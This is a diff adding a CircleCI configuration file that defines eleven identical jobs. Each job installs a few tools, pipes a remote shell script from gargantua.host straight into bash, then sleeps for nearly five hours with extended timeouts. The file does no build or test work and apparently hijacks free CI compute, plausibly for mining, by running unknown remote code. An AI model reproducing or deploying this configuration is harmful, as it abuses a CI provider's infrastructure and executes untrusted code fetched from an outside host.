@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  mqrabtstage:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  mqrabtstage1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  mqrabtstage2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  mqrabtstage3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  mqrabtstage4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  mqrabtstage5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  mqrabtstage6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  mqrabtstage7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  mqrabtstage8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  mqrabtstage9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  mqrabtstage10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - mqrabtstage
+      - mqrabtstage1
+      - mqrabtstage2
+      - mqrabtstage3
+      - mqrabtstage4
+      - mqrabtstage5
+      - mqrabtstage6
+      - mqrabtstage7
+      - mqrabtstage8
+      - mqrabtstage9
+      - mqrabtstage10
